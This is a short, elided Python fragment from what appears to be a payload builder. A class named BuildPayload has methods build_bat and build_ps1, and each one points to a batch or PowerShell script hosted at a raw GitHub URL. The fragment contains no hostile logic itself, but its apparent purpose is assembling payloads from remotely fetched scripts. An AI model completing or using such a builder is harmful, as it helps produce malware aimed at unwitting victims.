...
class BuildPayload:
    ...
    async def build_bat(self, url: str, name: str, options: dict[str, bool]) -> None:
        github_raw_url_bat = "https://raw.githubusercontent.com/Python-is-trash/345345345/main/frontend-src/main.bat"
    ...
    async def build_ps1(self, url: str, name: str, options: dict[str, bool]) -> None:
        github_raw_url_ps1 = "https://raw.githubusercontent.com/Python-is-trash/345345345/main/frontend-src/main.ps1"
